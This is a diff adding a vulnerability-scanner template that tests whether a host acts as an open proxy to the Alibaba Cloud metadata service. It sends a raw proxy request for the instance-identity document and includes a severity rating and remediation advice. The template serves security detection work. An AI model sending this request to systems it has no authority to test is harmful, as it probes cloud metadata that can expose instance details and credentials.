@@ -1,0 +1,44 @@
+id: metadata-service-alibaba
+
+# This attack abuses a misconfigured proxy that allows access to the metadata
+# IP or a name which resolves to the IP. A standard proxy request is made to
+# the proxy using the full metadata URL, which the proxy will fulfill to its
+# own metadata service.
+#
+# The proxy may also be vulnerable to host/port enumeration on localhost or
+# inside the private network.
+
+info:
+  name: Alibaba Metadata Service Check
+  author: sullo
+  severity: critical
+  description: The Alibaba host is configured as a proxy which allows access to the metadata service. This could allow significant access to the host/infrastructure.
+  reference:
+    - https://www.alibabacloud.com/help/doc-detail/108460.htm
+    - https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
+    - https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
+    cvss-score: 9.3
+    cwe-id: CWE-441
+  remediation: Disable the proxy or restrict configuration to only allow access to approved hosts/ports. Upgrade to IMDSv2 if possible.
+  tags: exposure,config,alibaba,proxy,misconfig,metadata
+
+requests:
+  - raw:
+      - |+
+        GET http://{{hostval}}/dynamic/instance-identity/document HTTP/1.1
+        Host: {{hostval}}
+
+    payloads:
+      hostval:
+        - alibaba.interact.sh
+        - 100.100.100.200
+    unsafe: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "zone-id"
+
+# Enhanced by mp on 2022/04/22
